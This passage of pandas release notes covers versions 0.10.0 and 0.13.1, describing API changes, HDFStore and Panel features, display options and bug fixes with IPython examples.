enough to break the rules*). Here's what I'm\ntalking about:\n\n.. ipython:: python\n   :okwarning:\n\n   import pandas as pd\n\n   df = pd.DataFrame(np.random.randn(6, 4), index=pd.date_range(\"1/1/2000\", periods=6))\n   df\n    deprecated now\n   df - df[0]\n    Change your code to\n   df.sub(df[0], axis=0)   align on axis 0 (rows)\n\nYou will get a deprecation warning in the 0.10.x series, and the deprecated\nfunctionality will be removed in 0.11 or later.\n\n**Altered resample default behavior**\n\nThe default time series ``resample`` binning behavior of daily ``D`` and\n*higher* frequencies has been changed to ``closed='left', label='left'``. Lower\nnfrequencies are unaffected. The prior defaults were causing a great deal of\nconfusion for users, especially resampling data to daily frequency (which\nlabeled the aggregated group with the end of the interval: the next day).\n\n.. code-block:: ipython\n\n   In [1]: dates = pd.date_range('1/1/2000', '1/5/2000', freq='4h')\n\n   In [2]: series = pd.Series(np.arange(len(dates)), index=dates)\n\n   In [3]: series\n   Out[3]:\n   2000-01-01 00:00:00     0\n   2000-01-01 04:00:00     1\n   2000-01-01 08:00:00     2\n   2000-01-01 12:00:00     3\n   2000-01-01 16:00:00     4\n   2000-01-01 20:00:00     5\n   2000-01-02 00:00:00     6\n   2000-01-02 04:00:00     7\n   2000-01-02 08:00:00     8\n   2000-01-02 12:00:00     9\n   2000-01-02 16:00:00    10\n   2000-01-02 20:00:00    11\n   2000-01-03 00:00:00    12\n   2000-01-03 04:00:00    13\n   2000-01-03 08:00:00    14\n   2000-01-03 12:00:00    15\n   2000-01-03 16:00:00    16\n   2000-01-03 20:00:00    17\n   2000-01-04 00:00:00    18\n   2000-01-04 04:00:00    19\n   2000-01-04 08:00:00    20\n   2000-01-04 12:00:00    21\n   2000-01-04 16:00:00    22\n   2000-01-04 20:00:00    23\n   2000-01-05 00:00:00    24\n   Freq: 4H, dtype: int64\n\n   In [4]: series.resample('D', how='sum')\n   Out[4]:\n   2000-01-01     15\n   2000-01-02     51\n   2000-01-03     87\n   2000-01-04    123\n   2000-01-05     24\n   Freq: D, dtype: int64\n\n   In [5]:  old behavior\n   In [6]: series.resample('D', how='sum', closed='right', label='right')\n   Out[6]:\n   2000-01-01      0\n   2000-01-02     21\n   2000-01-03     57\n   2000-01-04     93\n   2000-01-05    129\n   Freq: D, dtype: int64\n\n- Infinity and negative infinity are no longer treated as NA by ``isnull`` and\n  ``notnull``. That they ever were was a relic of early pandas. This behavior\n  can be re-enabled globally by the ``mode.use_inf_as_null`` option:\n\n.. code-block:: ipython\n\n    In [6]: s = pd.Series([1.5, np.inf, 3.4, -np.inf])\n\n    In [7]: pd.isnull(s)\n    Out[7]:\n    0    False\n    1    False\n    2    False\n    3    False\n    Length: 4, dtype: bool\n\n    In [8]: s.fillna(0)\n    Out[8]:\n    0    1.500000\n    1         inf\n    2    3.400000\n    3        -inf\n    Length: 4, dtype: float64\n\n    In [9]: pd.set_option('use_inf_as_null', True)\n\n    In [10]: pd.isnull(s)\n    Out[10]:\n    0    False\n    1     True\n    2    False\n    3     True\n    Length: 4, dtype: bool\n\n    In [11]: s.fillna(0)\n    Out[11]:\n    0    1.5\n    1    0.0\n    2    3.4\n    3    0.0\n    Length: 4, dtype: float64\n\n    In [12]: pd.reset_option('use_inf_as_null')\n\n- Methods with the ``inplace`` option now all return ``None`` instead of the\n  calling object. E.g. code written like ``df = df.fillna(0, inplace=True)``\n  may stop working. To fix, simply delete the unnecessary variable assignment.\n\n- ``pandas.merge`` no longer sorts the group keys (``sort=False``) by\n  default. This was done for performance reasons: the group-key sorting is\n  often one of the more expensive parts of the computation and is often\n  unnecessary.\n\n- The default column names for a file with no header have been changed to the\n  integers ``0`` through ``N - 1``. This is to create consistency with the\n  DataFrame constructor with no columns specified. The v0.9.0 behavior (names\n  ``X0``, ``X1``, ...) can be reproduced by specifying ``prefix='X'``:\n\n.. code-block:: ipython\n\n    In [6]: import io\n\n    In [7]: data = \"\"\"\n      ...: a,b,c\n      ...: 1,Yes,2\n      ...: 3,No,4\n      ...: \"\"\"\n      ...:\n\n    In [8]: print(data)\n\n        a,b,c\n        1,Yes,2\n        3,No,4\n\n    In [9]: pd.read_csv(io.StringIO(data), header=None)\n    Out[9]:\n           0    1  2\n    0      a    b  c\n    1      1  Yes  2\n    2      3   No  4\n\n    In [10]: pd.read_csv(io.StringIO(data), header=None, prefix=\"X\")\n    Out[10]:\n            X0   X1 X2\n    0       a    b  c\n    1       1  Yes  2\n    2       3   No  4\n\n- Values like ``'Yes'`` and ``'No'`` are not interpreted as boolean by default,\n  though this can be controlled by new ``true_values`` and ``false_values``\n  arguments:\n\n.. code-block:: ipython\n\n    In [4]: print(data)\n\n        a,b,c\n        1,Yes,2\n        3,No,4\n\n    In [5]: pd.read_csv(io.StringIO(data))\n    Out[5]:\n           a    b  c\n    0      1  Yes  2\n    1      3   No  4\n\n    In [6]: pd.read_csv(io.StringIO(data), true_values=[\"Yes\"], false_values=[\"No\"])\n    Out[6]:\n           a      b  c\n    0      1   True  2\n    1      3  False  4\n\n- The file parsers will not recognize non-string values arising from a\n  converter function as NA if passed in the ``na_values`` argument. It's better\n  to do post-processing using the ``replace`` function instead.\n\n- Calling ``fillna`` on Series or DataFrame with no arguments is no longer\n  valid code. You must either specify a fill value or an interpolation method:\n\n.. ipython:: python\n   :okwarning:\n\n   s = pd.Series([np.nan, 1.0, 2.0, np.nan, 4])\n   s\n   s.fillna(0)\n   s.fillna(method=\"pad\")\n\nConvenience methods ``ffill`` and  ``bfill`` have been added:\n\n.. ipython:: python\n\n   s.ffill()\n\n\n- ``Series.apply`` will now operate on a returned value from the applied\n  function, that is itself a series, and possibly upcast the result to a\n  DataFrame\n\n  .. ipython:: python\n\n      def f(x):\n          return pd.Series([x, x ** 2], index=[\"x\", \"x^2\"])\n\n\n      s = pd.Series(np.random.rand(5))\n      s\n      s.apply(f)\n\n- New API functions for working with pandas options (:issue:`2097`):\n\n  - ``get_option`` / ``set_option`` - get/set the value of an option. Partial\n    names are accepted.  - ``reset_option`` - reset one or more options to\n    their default value. Partial names are accepted.  - ``describe_option`` -\n    print a description of one or more options. When called with no\n    arguments. print all registered options.\n\n  Note: ``set_printoptions``/ ``reset_printoptions`` are now deprecated (but\n  functioning), the print options now live under \"display.XYZ\". For example:\n\n  .. ipython:: python\n\n     pd.get_option(\"display.max_rows\")\n\n- to_string() methods now always return unicode strings  (:issue:`2224`).\n\nNew features\n~~~~~~~~~~~~\n\nWide DataFrame printing\n~~~~~~~~~~~~~~~~~~~~~~~\n\nInstead of printing the summary information, pandas now splits the string\nrepresentation across multiple rows by default:\n\n.. ipython:: python\n\n   wide_frame = pd.DataFrame(np.random.randn(5, 16))\n\n   wide_frame\n\nThe old behavior of printing out summary information can be achieved via the\n'expand_frame_repr' print option:\n\n.. ipython:: python\n\n   pd.set_option(\"expand_frame_repr\", False)\n\n   wide_frame\n\n.. ipython:: python\n   :suppress:\n\n   pd.reset_option(\"expand_frame_repr\")\n\nThe width of each line can be changed via 'line_width' (80 by default):\n\n.. code-block:: python\n\n   pd.set_option(\"line_width\", 40)\n\n   wide_frame\n\n\nUpdated PyTables support\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n:ref:`Docs <io.hdf5>` for PyTables ``Table`` format & several enhancements to the api. Here is a taste of what to expect.\n\n.. code-block:: ipython\n\n    In [41]: store = pd.HDFStore('store.h5')\n\n    In [42]: df = pd.DataFrame(np.random.randn(8, 3),\n       ....:                   index=pd.date_range('1/1/2000', periods=8),\n       ....:                   columns=['A', 'B', 'C'])\n\n    In [43]: df\n    Out[43]:\n                       A         B         C\n    2000-01-01 -2.036047  0.000830 -0.955697\n    2000-01-02 -0.898872 -0.725411  0.059904\n    2000-01-03 -0.449644  1.082900 -1.221265\n    2000-01-04  0.361078  1.330704  0.855932\n    2000-01-05 -1.216718  1.488887  0.018993\n    2000-01-06 -0.877046  0.045976  0.437274\n    2000-01-07 -0.567182 -0.888657 -0.556383\n    2000-01-08  0.655457  1.117949 -2.782376\n\n    [8 rows x 3 columns]\n\n     appending data frames\n    In [44]: df1 = df[0:4]\n\n    In [45]: df2 = df[4:]\n\n    In [46]: store.append('df', df1)\n\n    In [47]: store.append('df', df2)\n\n    In [48]: store\n    Out[48]:\n    <class 'pandas.io.pytables.HDFStore'>\n    File path: store.h5\n    /df            frame_table  (typ->appendable,nrows->8,ncols->3,indexers->[index])\n\n     selecting the entire store\n    In [49]: store.select('df')\n    Out[49]:\n                       A         B         C\n    2000-01-01 -2.036047  0.000830 -0.955697\n    2000-01-02 -0.898872 -0.725411  0.059904\n    2000-01-03 -0.449644  1.082900 -1.221265\n    2000-01-04  0.361078  1.330704  0.855932\n    2000-01-05 -1.216718  1.488887  0.018993\n    2000-01-06 -0.877046  0.045976  0.437274\n    2000-01-07 -0.567182 -0.888657 -0.556383\n    2000-01-08  0.655457  1.117949 -2.782376\n\n    [8 rows x 3 columns]\n\n.. code-block:: ipython\n\n    In [50]: wp = pd.Panel(np.random.randn(2, 5, 4), items=['Item1', 'Item2'],\n       ....:               major_axis=pd.date_range('1/1/2000', periods=5),\n       ....:               minor_axis=['A', 'B', 'C', 'D'])\n\n    In [51]: wp\n    Out[51]:\n    <class 'pandas.core.panel.Panel'>\n    Dimensions: 2 (items) x 5 (major_axis) x 4 (minor_axis)\n    Items axis: Item1 to Item2\n    Major_axis axis: 2000-01-01 00:00:00 to 2000-01-05 00:00:00\n    Minor_axis axis: A to D\n\n     storing a panel\n    In [52]: store.append('wp', wp)\n\n     selecting via A QUERY\n    In [53]: store.select('wp', [pd.Term('major_axis>20000102'),\n       ....:                     pd.Term('minor_axis', '=', ['A', 'B'])])\n       ....:\n    Out[53]:\n    <class 'pandas.core.panel.Panel'>\n    Dimensions: 2 (items) x 3 (major_axis) x 2 (minor_axis)\n    Items axis: Item1 to Item2\n    Major_axis axis: 2000-01-03 00:00:00 to 2000-01-05 00:00:00\n    Minor_axis axis: A to B\n\n     removing data from tables\n    In [54]: store.remove('wp', pd.Term('major_axis>20000103'))\n    Out[54]: 8\n\n    In [55]: store.select('wp')\n    Out[55]:\n    <class 'pandas.core.panel.Panel'>\n    Dimensions: 2 (items) x 3 (major_axis) x 4 (minor_axis)\n    Items axis: Item1 to Item2\n    Major_axis axis: 2000-01-01 00:00:00 to 2000-01-03 00:00:00\n    Minor_axis axis: A to D\n\n     deleting a store\n    In [56]: del store['df']\n\n    In [57]: store\n    Out[57]:\n    <class 'pandas.io.pytables.HDFStore'>\n    File path: store.h5\n    /wp            wide_table   (typ->appendable,nrows->12,ncols->2,indexers->[major_axis,minor_axis])\n\n\n**Enhancements**\n\n- added ability to hierarchical keys\n\n   .. code-block:: ipython\n\n        In [58]: store.put('foo/bar/bah', df)\n\n        In [59]: store.append('food/orange', df)\n\n        In [60]: store.append('food/apple', df)\n\n        In [61]: store\n        Out[61]:\n        <class 'pandas.io.pytables.HDFStore'>\n        File path: store.h5\n        /foo/bar/bah            frame        (shape->[8,3])\n        /food/apple             frame_table  (typ->appendable,nrows->8,ncols->3,indexers->[index])\n        /food/orange            frame_table  (typ->appendable,nrows->8,ncols->3,indexers->[index])\n        /wp                     wide_table   (typ->appendable,nrows->12,ncols->2,indexers->[major_axis,minor_axis])\n\n         remove all nodes under this level\n        In [62]: store.remove('food')\n\n        In [63]: store\n        Out[63]:\n        <class 'pandas.io.pytables.HDFStore'>\n        File path: store.h5\n        /foo/bar/bah            frame        (shape->[8,3])\n        /wp                     wide_table   (typ->appendable,nrows->12,ncols->2,indexers->[major_axis,minor_axis])\n\n- added mixed-dtype support!\n\n   .. code-block:: ipython\n\n        In [64]: df['string'] = 'string'\n\n        In [65]: df['int'] = 1\n\n        In [66]: store.append('df', df)\n\n        In [67]: df1 = store.select('df')\n\n        In [68]: df1\n        Out[68]:\n                           A         B         C  string  int\n        2000-01-01 -2.036047  0.000830 -0.955697  string    1\n        2000-01-02 -0.898872 -0.725411  0.059904  string    1\n        2000-01-03 -0.449644  1.082900 -1.221265  string    1\n        2000-01-04  0.361078  1.330704  0.855932  string    1\n        2000-01-05 -1.216718  1.488887  0.018993  string    1\n        2000-01-06 -0.877046  0.045976  0.437274  string    1\n        2000-01-07 -0.567182 -0.888657 -0.556383  string    1\n        2000-01-08  0.655457  1.117949 -2.782376  string    1\n\n        [8 rows x 5 columns]\n\n        In [69]: df1.get_dtype_counts()\n        Out[69]:\n        float64    3\n        int64      1\n        object     1\n        dtype: int64\n\n- performance improvements on table writing\n- support for arbitrarily indexed dimensions\n- ``SparseSeries`` now has a ``density`` property (:issue:`2384`)\n- enable ``Series.str.strip/lstrip/rstrip`` methods to take an input argument\n  to strip arbitrary characters (:issue:`2411`)\n- implement ``value_vars`` in ``melt`` to limit values to certain columns\n  and add ``melt`` to pandas namespace (:issue:`2412`)\n\n**Bug Fixes**\n\n- added ``Term`` method of specifying where conditions (:issue:`1996`).\n- ``del store['df']`` now call ``store.remove('df')`` for store deletion\n- deleting of consecutive rows is much faster than before\n- ``min_itemsize`` parameter can be specified in table creation to force a\n  minimum size for indexing columns (the previous implementation would set the\n  column size based on the first append)\n- indexing support via ``create_table_index`` (requires PyTables >= 2.3)\n  (:issue:`698`).\n- appending on a store would fail if the table was not first created via ``put``\n- fixed issue with missing attributes after loading a pickled dataframe (GH2431)\n- minor change to select and remove: require a table ONLY if where is also\n  provided (and not None)\n\n**Compatibility**\n\n0.10 of ``HDFStore`` is backwards compatible for reading tables created in a prior version of pandas,\nhowever, query terms using the prior (undocumented) methodology are unsupported. You must read in the entire\nfile and write it out using the new format to take advantage of the updates.\n\nN dimensional panels (experimental)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAdding experimental support for Panel4D and factory functions to create n-dimensional named panels.\nHere is a taste of what to expect.\n\n.. code-block:: ipython\n\n  In [58]: p4d = Panel4D(np.random.randn(2, 2, 5, 4),\n    ....:       labels=['Label1','Label2'],\n    ....:       items=['Item1', 'Item2'],\n    ....:       major_axis=date_range('1/1/2000', periods=5),\n    ....:       minor_axis=['A', 'B', 'C', 'D'])\n    ....:\n\n  In [59]: p4d\n  Out[59]:\n  <class 'pandas.core.panelnd.Panel4D'>\n  Dimensions: 2 (labels) x 2 (items) x 5 (major_axis) x 4 (minor_axis)\n  Labels axis: Label1 to Label2\n  Items axis: Item1 to Item2\n  Major_axis axis: 2000-01-01 00:00:00 to 2000-01-05 00:00:00\n  Minor_axis axis: A to D\n\n\n\n\n\nSee the :ref:`full release notes\n<release>` or issue tracker\non GitHub for a complete list.\n\n\n.. _whatsnew_0.10.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.9.0..v0.10.0\n\n\n.. _whatsnew_0131:\n\nVersion 0.13.1 (February 3, 2014)\n---------------------------------\n\n{{ header }}\n\n\n\nThis is a minor release from 0.13.0 and includes a small number of API changes, several new features,\nenhancements, and performance improvements along with a large number of bug fixes. We recommend that all\nusers upgrade to this version.\n\nHighlights include:\n\n- Added ``infer_datetime_format`` keyword to ``read_csv/to_datetime`` to allow speedups for homogeneously formatted datetimes.\n- Will intelligently limit display precision for datetime/timedelta formats.\n- Enhanced Panel :meth:`~pandas.Panel.apply` method.\n- Suggested tutorials in new :ref:`Tutorials<tutorials>` section.\n- Our pandas ecosystem is growing, We now feature related projects in a new `ecosystem page <https://pandas.pydata.org/community/ecosystem.html>`_ section.\n- Much work has been taking place on improving the docs, and a new :ref:`Contributing<contributing>` section has been added.\n- Even though it may only be of interest to devs, we <3 our new CI status page: `ScatterCI <http://scatterci.github.io/pydata/pandas>`__.\n\n.. warning::\n\n   0.13.1 fixes a bug that was caused by a combination of having numpy < 1.8, and doing\n   chained assignment on a string-like array. Please review :ref:`the docs<indexing.view_versus_copy>`,\n   chained indexing can have unexpected results and should generally be avoided.\n\n   This would previously segfault:\n\n   .. code-block:: python\n\n      df = pd.DataFrame({\"A\": np.array([\"foo\", \"bar\", \"bah\", \"foo\", \"bar\"])})\n      df[\"A\"].iloc[0] = np.nan\n\n   The recommended way to do this type of assignment is:\n\n   .. ipython:: python\n\n      df = pd.DataFrame({\"A\": np.array([\"foo\", \"bar\", \"bah\", \"foo\", \"bar\"])})\n      df.loc[0, \"A\"] = np.nan\n      df\n\nOutput formatting enhancements\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- df.info() view now display dtype info per column (:issue:`5682`)\n\n- df.info() now honors the option ``max_info_rows``, to disable null counts for large frames (:issue:`5974`)\n\n  .. ipython:: python\n\n     max_info_rows = pd.get_option(\"max_info_rows\")\n\n     df = pd.DataFrame(\n         {\n             \"A\": np.random.randn(10),\n             \"B\": np.random.randn(10),\n             \"C\": pd.date_range(\"20130101\", periods=10),\n         }\n     )\n     df.iloc[3:6, [0, 2]] = np.nan\n\n  .. ipython:: python\n\n      set to not display the null counts\n     pd.set_option(\"max_info_rows\", 0)\n     df.info()\n\n  .. ipython:: python\n\n      this is the default (same as in 0.13.0)\n     pd.set_option(\"max_info_rows\", max_info_rows)\n     df.info()\n\n- Add ``show_dimensions`` display option for the new DataFrame repr to control whether the dimensions print.\n\n  .. ipython:: python\n\n      df = pd.DataFrame([[1, 2], [3, 4]])\n      pd.set_option(\"show_dimensions\", False)\n      df\n\n      pd.set_option(\"show_dimensions\", True)\n      df\n\n- The ``ArrayFormatter`` for ``datetime`` and ``timedelta64`` now intelligently\n  limit precision based on the values in the array (:issue:`3401`)\n\n  Previously output might look like:\n\n  ..   code-block:: text\n\n        age                 today               diff\n      0 2001-01-01 00:00:00 2013-04-19 00:00:00 4491 days, 00:00:00\n      1 2004-06-01 00:00:00 2013-04-19 00:00:00 3244 days, 00:00:00\n\n  Now the output looks like:\n\n  .. ipython:: python\n\n     df = pd.DataFrame(\n         [pd.Timestamp(\"20010101\"), pd.Timestamp(\"20040601\")], columns=[\"age\"]\n     )\n     df[\"today\"] = pd.Timestamp(\"20130419\")\n     df[\"diff\"] = df[\"today\"] - df[\"age\"]\n     df\n\nAPI changes\n~~~~~~~~~~~\n\n- Add ``-NaN`` and ``-nan`` to the default set of NA values (:issue:`5952`).\n  See :ref:`NA Values <io.na_values>`.\n\n- Added ``Series.str.get_dummies`` vectorized string method (:issue:`6021`), to extract\n  dummy/indicator variables for separated string columns:\n\n  .. ipython:: python\n\n      s = pd.Series([\"a\", \"a|b\", np.nan, \"a|c\"])\n      s.str.get_dummies(sep=\"|\")\n\n- Added the ``NDFrame.equals()`` method to compare if two NDFrames are\n  equal have equal axes, dtypes, and values. Added the\n  ``array_equivalent`` function to compare if two ndarrays are\n  equal. NaNs in identical locations are treated as\n  equal. (:issue:`5283`) See also :ref:`the docs<basics.equals>` for a motivating example.\n\n  .. code-block:: python\n\n      df = pd.DataFrame({\"col\": [\"foo\", 0, np.nan]})\n      df2 = pd.DataFrame({\"col\": [np.nan, 0, \"foo\"]}, index=[2, 1, 0])\n      df.equals(df2)\n      df.equals(df2.sort_index())\n\n- ``DataFrame.apply`` will use the ``reduce`` argument to determine whether a\n  ``Series`` or a ``DataFrame`` should be returned when the ``DataFrame`` is\n  empty (:issue:`6007`).\n\n  Previously, calling ``DataFrame.apply`` an empty ``DataFrame`` would return\n  either a ``DataFrame`` if there were no columns, or the function being\n  applied would be called with an empty ``Series`` to guess whether a\n  ``Series`` or ``DataFrame`` should be returned:\n\n  .. code-block:: ipython\n\n    In [32]: def applied_func(col):\n      ....:    print(\"Apply function being called with: \", col)\n      ....:    return col.sum()\n      ....:\n\n    In [33]: empty = DataFrame(columns=['a', 'b'])\n\n    In [34]: empty.apply(applied_func)\n    Apply function being called with:  Series([], Length: 0, dtype: float64)\n    Out[34]:\n    a   NaN\n    b   NaN\n    Length: 2, dtype: float64\n\n  Now, when ``apply`` is called on an empty ``DataFrame``: if the ``reduce``\n  argument is ``True`` a ``Series`` will returned, if it is ``False`` a\n  ``DataFrame`` will be returned, and if it is ``None`` (the default) the\n  function being applied will be called with an empty series to try and guess\n  the return type.\n\n  .. code-block:: ipython\n\n    In [35]: empty.apply(applied_func, reduce=True)\n    Out[35]:\n    a   NaN\n    b   NaN\n    Length: 2, dtype: float64\n\n    In [36]: empty.apply(applied_func, reduce=False)\n    Out[36]:\n    Empty DataFrame\n    Columns: [a, b]\n    Index: []\n\n    [0 rows x 2 columns]\n\n\nPrior version deprecations/changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThere are no announced changes in 0.13 or prior that are taking effect as of 0.13.1\n\nDeprecations\n~~~~~~~~~~~~\n\nThere are no deprecations of prior behavior in 0.13.1\n\nEnhancements\n~~~~~~~~~~~~\n\n- ``pd.read_csv`` and ``pd.to_datetime`` learned a new ``infer_datetime_format`` keyword which greatly\n  improves parsing perf in many cases. Thanks to lexual for suggesting and danbirken\n  for rapidly implementing. (:issue:`5490`, :issue:`6021`)\n\n  If ``parse_dates`` is enabled and this flag is set, pandas will attempt to\n  infer the format of the datetime strings in the columns, and if it can\n  be inferred, switch to a faster method of parsing them.  In some cases\n  this can increase the parsing speed by ~5-10x.\n\n  .. code-block:: python\n\n       Try to infer the format for the index column\n      df = pd.read_csv(\n          \"foo.csv\", index_col=0, parse_dates=True, infer_datetime_format=True\n      )\n\n- ``date_format`` and ``datetime_format`` keywords can now be specified when writing to ``excel``\n  files (:issue:`4133`)\n\n- ``MultiIndex.from_product`` convenience function for creating a MultiIndex from\n  the cartesian product of a set of iterables (:issue:`6055`):\n\n  .. ipython:: python\n\n      shades = [\"light\", \"dark\"]\n      colors = [\"red\", \"green\", \"blue\"]\n\n      pd.MultiIndex.from_product([shades, colors], names=[\"shade\", \"color\"])\n\n- Panel :meth:`~pandas.Panel.apply` will work on non-ufuncs. See :ref:`the docs<basics.apply>`.\n\n  .. code-block:: ipython\n\n      In [28]: import pandas._testing as tm\n\n      In [29]: panel = tm.makePanel(5)\n\n      In [30]: panel\n      Out[30]:\n      <class 'pandas.core.panel.Panel'>\n      Dimensions: 3 (items) x 5 (major_axis) x 4 (minor_axis)\n      Items axis: ItemA to ItemC\n      Major_axis axis: 2000-01-03 00:00:00 to 2000-01-07 00:00:00\n      Minor_axis axis: A to D\n\n      In [31]: panel['ItemA']\n      Out[31]:\n                         A         B         C         D\n      2000-01-03 -0.673690  0.577046 -1.344312 -1.469388\n      2000-01-04  0.113648 -1.715002  0.844885  0.357021\n      2000-01-05 -1.478427 -1.039268  1.075770 -0.674600\n      2000-01-06  0.524988 -0.370647 -0.109050 -1.776904\n      2000-01-07  0.404705 -1.157892  1.643563 -0.968914\n\n      [5 rows x 4 columns]\n\n  Specifying an ``apply`` that operates on a Series (to return a single element)\n\n  .. code-block:: ipython\n\n      In [32]: panel.apply(lambda x: x.dtype, axis='items')\n      Out[32]:\n                        A        B        C        D\n      2000-01-03  float64  float64  float64  float64\n      2000-01-04  float64  float64  float64  float64\n      2000-01-05  float64  float64  float64  float64\n      2000-01-06  float64  float64  float64  float64\n      2000-01-07  float64  float64  float64  float64\n\n      [5 rows x 4 columns]\n\n  A similar reduction type operation\n\n  .. code-block:: ipython\n\n      In [33]: panel.apply(lambda x: x.sum(), axis='major_axis')\n      Out[33]:\n            ItemA     ItemB     ItemC\n      A -1.108775 -1.090118 -2.984435\n      B -3.705764  0.409204  1.866240\n      C  2.110856  2.960500 -0.974967\n      D -4.532785  0.303202 -3.685193\n\n      [4 rows x 3 columns]\n\n  This is equivalent to\n\n  .. code-block:: ipython\n\n      In [34]: panel.sum('major_axis')\n      Out[34]:\n            ItemA     ItemB     ItemC\n      A -1.108775 -1.090118 -2.984435\n      B -3.705764  0.409204  1.866240\n      C  2.110856  2.960500 -0.974967\n      D -4.532785  0.303202 -3.685193\n\n      [4 rows x 3 columns]\n\n  A transformation operation that returns a Panel, but is computing\n  the z-score across the major_axis\n\n  .. code-block:: ipython\n\n      In [35]: result = panel.apply(lambda x: (x - x.mean()) / x.std(),\n        ....:                      axis='major_axis')\n        ....:\n\n      In [36]: result\n      Out[36]:\n      <class 'pandas.core.panel.Panel'>\n      Dimensions: 3 (items) x 5 (major_axis) x 4 (minor_axis)\n      Items axis: ItemA to ItemC\n      Major_axis axis: 2000-01-03 00:00:00 to 2000-01-07 00:00:00\n      Minor_axis axis: A to D\n\n      In [37]: result['ItemA']                            noqa E999\n      Out[37]:\n                        A         B         C         D\n      2000-01-03 -0.535778  1.500802 -1.506416 -0.681456\n      2000-01-04  0.397628 -1.108752  0.360481  1.529895\n      2000-01-05 -1.489811 -0.339412  0.557374  0.280845\n      2000-01-06  0.885279  0.421830 -0.453013 -1.053785\n      2000-01-07  0.742682 -0.474468  1.041575 -0.075499\n\n      [5 rows x 4 columns]\n\n- Panel :meth:`~pandas.Panel.apply` operating on cross-sectional slabs. (:issue:`1148`)\n\n  .. code-block:: ipython\n\n      In [38]: def f(x):\n         ....:     return ((x.T - x.mean(1)) / x.std(1)).T\n         ....:\n\n      In [39]: result = panel.apply(f, axis=['items', 'major_axis'])\n\n      In [40]: result\n      Out[40]:\n      <class 'pandas.core.panel.Panel'>\n      Dimensions: 4 (items) x 5 (major_axis) x 3 (minor_axis)\n      Items axis: A to D\n      Major_axis axis: 2000-01-03 00:00:00 to 2000-01-07 00:00:00\n      Minor_axis axis: ItemA to ItemC\n\n      In [41]: result.loc[:, :, 'ItemA']\n      Out[41]:\n                         A         B         C         D\n      2000-01-03  0.012922 -0.030874 -0.629546 -0.757034\n      2000-01-04  0.392053 -1.071665  0.163228  0.548188\n      2000-01-05 -1.093650 -0.640898  0.385734 -1.154310\n      2000-01-06  1.005446 -1.154593 -0.595615 -0.809185\n      2000-01-07  0.783051 -0.198053  0.919339 -1.052721\n\n      [5 rows x 4 columns]\n\n  This is equivalent to the following\n\n  .. code-block:: ipython\n\n      In [42]: result = pd.Panel({ax: f(panel.loc[:, :, ax]) for ax in panel.minor_axis})\n\n      In [43]: result\n      Out[43]:\n      <class 'pandas.core.panel.Panel'>\n      Dimensions: 4 (items) x 5 (major_axis) x 3 (minor_axis)\n      Items axis: A to D\n      Major_axis axis: 2000-01-03 00:00:00 to 2000-01-07 00:00:00\n      Minor_axis axis: ItemA to ItemC\n\n      In [44]: result.loc[:, :, 'ItemA']\n      Out[44]:\n                         A         B         C         D\n      2000-01-03  0.012922 -0.030874 -0.629546 -0.757034\n      2000-01-04  0.392053 -1.071665  0.163228  0.548188\n      2000-01-05 -1.093650 -0.640898  0.385734 -1.154310\n      2000-01-06  1.005446 -1.154593 -0.595615 -0.809185\n      2000-01-07  0.783051 -0.198053  0.919339 -1.052721\n\n      [5 rows x 4 columns]\n\nPerformance\n~~~~~~~~~~~\n\nPerformance improvements for 0.13.1\n\n- Series datetime/timedelta binary operations (:issue:`5801`)\n- DataFrame ``count/dropna`` for ``axis=1``\n- Series.str.contains now has a ``regex=False`` keyword which can be faster for plain (non-regex) string patterns. (:issue:`5879`)\n- Series.str.extract (:issue:`5944`)\n- ``dtypes/ftypes`` methods (:issue:`5968`)\n- indexing with object dtypes (:issue:`5968`)\n- ``DataFrame.apply`` (:issue:`6013`)\n- Regression in JSON IO (:issue:`5765`)\n- Index construction from Series (:issue:`6150`)\n\nExperimental\n~~~~~~~~~~~~\n\nThere are no experimental changes in 0.13.1\n\n.. _release.bug_fixes-0.13.1:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in ``io.wb.get_countries`` not including all countries (:issue:`6008`)\n- Bug in Series replace with timestamp dict (:issue:`5797`)\n- read_csv/read_table now respects the ``prefix`` kwarg (:issue:`5732`).\n- Bug in selection with missing values via ``.ix`` from a duplicate indexed DataFrame failing (:issue:`5835`)\n- Fix issue of boolean comparison on empty DataFrames (:issue:`5808`)\n- Bug in isnull handling ``NaT`` in an object array (:issue:`5443`)\n- Bug in ``to_datetime`` when passed a ``np.nan`` or integer datelike and a format string (:issue:`5863`)\n- Bug in groupby dtype conversion with datetimelike (:issue:`5869`)\n- Regression in handling of empty Series as indexers to Series  (:issue:`5877`)\n- Bug in internal caching, related to (:issue:`5727`)\n- Testing bug in reading JSON/msgpack from a non-filepath on windows under py3 (:issue:`5874`)\n- Bug when assigning to .ix[tuple(...)] (:issue:`5896`)\n- Bug in fully reindexing a Panel (:issue:`5905`)\n- Bug in idxmin/max with object dtypes (:issue:`5914`)\n- Bug in ``BusinessDay`` when adding n days to a date not on offset when n>5 and n%5==0 (:issue:`5890`)\n- Bug in assigning to chained series with a series via ix (:issue:`5928`)\n- Bug in creating an empty DataFrame, copying, then assigning (:issue:`5932`)\n- Bug in DataFrame.tail with empty frame (:issue:`5846`)\n- Bug in propagating metadata on ``resample`` (:issue:`5862`)\n- Fixed string-representation of ``NaT`` to be \"NaT\" (:issue:`5708`)\n- Fixed string-representation for Timestamp to show nanoseconds if present (:issue:`5912`)\n- ``pd.match`` not returning passed sentinel\n- ``Panel.to_frame()`` no longer fails when ``major_axis`` is a\n  ``MultiIndex`` (:issue:`5402`).\n- Bug in ``pd.read_msgpack`` with inferring a ``DateTimeIndex`` frequency\n  incorrectly (:issue:`5947`)\n- Fixed ``to_datetime`` for array with both Tz-aware datetimes and ``NaT``'s  (:issue:`5961`)\n- Bug in rolling skew/kurtosis when passed a Series with bad data (:issue:`5749`)\n- Bug in scipy ``interpolate`` methods with a datetime index (:issue:`5975`)\n- Bug in NaT comparison if a mixed datetime/np.datetime64 with NaT were passed (:issue:`5968`)\n- Fixed bug with ``pd.concat`` losing dtype information if all inputs are empty (:issue:`5742`)\n- Recent changes in IPython cause warnings to be emitted when using previous versions\n  of pandas in QTConsole, now fixed. If you're using an older version and\n  need to suppress the warnings, see (:issue:`5922`).\n- Bug in merging ``timedelta`` dtypes (:issue:`5695`)\n- Bug in plotting.scatter_matrix function. Wrong alignment among diagonal\n  and off-diagonal plots, see (:issue:`5497`).\n- Regression in 